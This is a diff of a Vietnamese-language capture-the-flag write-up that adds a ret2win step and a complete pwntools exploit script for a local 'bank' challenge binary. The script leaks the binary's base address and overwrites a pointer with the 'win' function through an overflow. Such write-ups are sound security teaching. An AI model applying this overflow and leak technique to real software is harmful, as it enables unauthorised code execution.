@@ -11,7 +11,7 @@ Tạo script login sẵn:
     libc = ELF("./libc.so.6")
     ld = ELF("./ld-2.35.so")
     context.binary = exe
-    p=process('bank_patched')
+    p=process('./bank_patched')
     
     p.sendlineafter(b'Choice:',b'1')      //tạo tài khoản
     p.sendlineafter(b'Username:',b'zyan')
@@ -74,6 +74,64 @@ Leak binary:
     exe.address=exe_leak-0x1684
     print(hex(exe_leak))
 
+    
+<img width="750" height="253" alt="Screenshot 2026-11-18 141728" src="https://github.com/user-attachments/assets/a381c0ae-68df-4d69-bd3c-ae9eb819c12a" />
+<img width="760" height="209" alt="image" src="https://github.com/user-attachments/assets/1e078365-7d9d-4276-9c7b-0eb7e5b09cb4" />
 
+## ret2win
 
+Lúc này đã có binary base, chỉ cần ghi đè hàm `win` lên `viewBalance` để chuyển hướng lấy flag.
 
+Overwrite:
+
+    payload=b'A'*24
+    payload+=p64(exe.sym['win'])
+    p.sendlineafter(b'Choice:',b'3')
+    p.sendafter(b'New Description:',payload)
+    
+    p.sendlineafter(b'Choice:',b'1')
+    p.interactive()
+
+# Script python
+
+    #!/usr/bin/env python3
+    from pwn import *
+    exe = ELF("./bank_patched")
+    libc = ELF("./libc.so.6")
+    ld = ELF("./ld-2.35.so")
+    context.binary = exe
+    p=process('./bank_patched')
+    
+    p.sendlineafter(b'Choice:',b'1')
+    p.sendlineafter(b'Username:',b'zyan')
+    p.sendlineafter(b'Password:',b'1')
+    p.sendlineafter(b'Description:',b'A')
+    
+    p.sendlineafter(b'Choice:',b'2')
+    p.sendlineafter(b'Username:',b'zyan')
+    p.sendlineafter(b'Password:',b'1')
+    
+    for i in range(7):
+        payload=b'A'*16
+        payload+=b'\xff'*(7-i)
+        p.sendlineafter(b'Choice:',b'3')
+        p.sendafter(b'New Description:',payload)
+        p.sendlineafter(b'Choice:',b'4')
+        p.sendlineafter(b':',b'1')
+    
+    p.sendlineafter(b'Choice:',b'4')
+    p.sendlineafter(b':',b'1')
+    
+    p.sendlineafter(b'Choice:',b'2')
+    p.recvuntil(b'\x01'*8)
+    exe_leak=u64(p.recv(6)+b'\x00\x00')
+    exe.address=exe_leak-0x1684
+    print(hex(exe_leak))
+    
+    payload=b'A'*24
+    payload+=p64(exe.sym['win'])
+    p.sendlineafter(b'Choice:',b'3')
+    p.sendafter(b'New Description:',payload)
+    
+    p.sendlineafter(b'Choice:',b'1')
+    p.interactive()
